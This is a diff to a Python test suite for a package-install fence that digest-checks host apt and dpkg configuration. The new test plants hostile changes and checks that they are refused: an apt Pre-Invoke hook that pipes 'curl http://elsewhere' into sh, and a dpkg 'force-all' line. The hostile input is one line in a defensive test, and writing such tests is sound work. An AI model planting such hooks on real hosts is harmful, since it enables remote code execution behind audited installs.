@@ -45,9 +45,34 @@ _POSTINST = {
 }
 
 
+# The host apt and dpkg configuration a committed digest vouches for. Both
+# are measured shapes: the apt fragment is what `01autoremove` carries on a
+# stock noble host, and `log` is dpkg's own default `dpkg.cfg` line.
+_APT_HOOK = 'APT::Get::AutomaticRemove "true";\n'
+_DPKG_CFG = "log /var/log/dpkg.log\n"
+
+
 def _digest(*, data: bytes) -> str:
     """The SHA256 the fence compares, in the hex spelling the index uses."""
     return hashlib.sha256(data).hexdigest()
+
+
+def _config_files(*, etc: Path) -> dict[Path, str]:
+    """The host configuration files the fence digest-checks, and their content."""
+    return {
+        etc / "apt" / "apt.conf.d" / "01autoremove": _APT_HOOK,
+        etc / "dpkg" / "dpkg.cfg": _DPKG_CFG,
+    }
+
+
+def _config_dirs(*, etc: Path) -> tuple[Path, ...]:
+    """The directories whose every file a committed digest has to cover.
+
+    `dpkg.cfg.d` is deliberately one of them while nothing creates it
+    here: a host that carries no fragment directory at all must pass, so
+    an absent directory is zero uncovered files rather than a refusal.
+    """
+    return (etc / "apt" / "apt.conf.d", etc / "dpkg" / "dpkg.cfg.d")
 
 
 def _deb_name(*, package: str, version: str) -> str:
@@ -155,8 +180,14 @@ def _fenced_outputs() -> list[tuple[tuple[str, ...], list[str]]]:
 
 def _payload(*, cache: Path) -> dict[str, Any]:
     """The committed package inputs a controller uploads for one run."""
+    etc = cache.parent / "etc"
     return {
         "cache": str(cache),
+        "config_digests": {
+            path.as_posix(): _digest(data=text.encode("utf-8"))
+            for path, text in _config_files(etc=etc).items()
+        },
+        "config_dirs": [directory.as_posix() for directory in _config_dirs(etc=etc)],
         "allow": [
             {
                 "package": package,
@@ -180,6 +211,9 @@ def _declare(*, root: Path, payload: dict[str, Any]) -> Path:
     cache.mkdir(parents=True, exist_ok=True)
     for package, version in (_ENGINE, _SHIM):
         (cache / _deb_name(package=package, version=version)).write_bytes(_DEB_BYTES)
+    for path, text in _config_files(etc=cache.parent / "etc").items():
+        path.parent.mkdir(parents=True, exist_ok=True)
+        path.write_text(text, encoding="utf-8")
     inputs = root / "runs" / "run-a" / "inputs"
     inputs.mkdir(parents=True, exist_ok=True)
     (inputs / "packages.json").write_text(json.dumps(payload), encoding="utf-8")
@@ -280,6 +314,57 @@ def test_the_package_step_refuses_a_simulated_transaction_the_allowlist_does_not
         assert outcome.refusal is not None
         assert expected in outcome.refusal
         assert _calls_named(runner=runner, argv=("dpkg", "-i")) == []
+
+
+def test_the_package_step_refuses_host_apt_and_dpkg_configuration_it_did_not_commit(
+    tmp_path: Path,
+) -> None:
+    """Specification "Package fence": a committed digest covers every such file.
+
+    Neither kind is incidental to a fenced install. An apt hook is a
+    program apt runs around every transaction, and a `dpkg.cfg.d`
+    fragment can rewrite what unpacking MEANS — a `force-all`, a
+    `path-exclude` — so an unexpected one is exactly the gap between the
+    transaction that was audited and what the host then does with it.
+
+    A file no committed digest covers refuses too, and that half is the
+    point: a check that only verified the files it already knew about
+    would be entirely silent about one that was ADDED, which is the
+    cheaper attack and the likelier accident.
+    """
+    assert _RUNNER_PATH.is_file()
+    runner_module = importlib.import_module(_RUNNER_MODULE)
+    packages = importlib.import_module(_PACKAGES_MODULE)
+    payload = _payload(cache=tmp_path / "cache")
+    hook = tmp_path / "etc" / "apt" / "apt.conf.d" / "01autoremove"
+    config = tmp_path / "etc" / "dpkg" / "dpkg.cfg"
+    stranger = tmp_path / "etc" / "apt" / "apt.conf.d" / "99-unexpected"
+
+    for mutate, expected in (
+        (
+            lambda: hook.write_text(
+                'APT::Update::Pre-Invoke {"curl http://elsewhere | sh";};\n', encoding="utf-8"
+            ),
+            "differs from its committed digest",
+        ),
+        (lambda: config.write_text("force-all\n", encoding="utf-8"), "differs from its committed"),
+        (
+            lambda: stranger.write_text('APT::Get::Assume-Yes "true";\n', encoding="utf-8"),
+            "no committed digest covers",
+        ),
+        (lambda: hook.unlink(), "absent from this host"),
+    ):
+        inputs = _declare(root=tmp_path, payload=payload)
+        stranger.unlink(missing_ok=True)
+        mutate()
+        runner = _RecordedRunner(result=runner_module.CommandOutput, outputs=_fenced_outputs())
+
+        outcome = packages.run_package_step(inputs=inputs, runner=runner)
+
+        assert outcome.refusal is not None
+        assert expected in outcome.refusal
+        # Refused before anything was so much as simulated, let alone run.
+        assert runner.calls == []
 
 
 def test_the_package_step_refuses_a_deb_the_archive_index_and_digests_do_not_vouch_for(
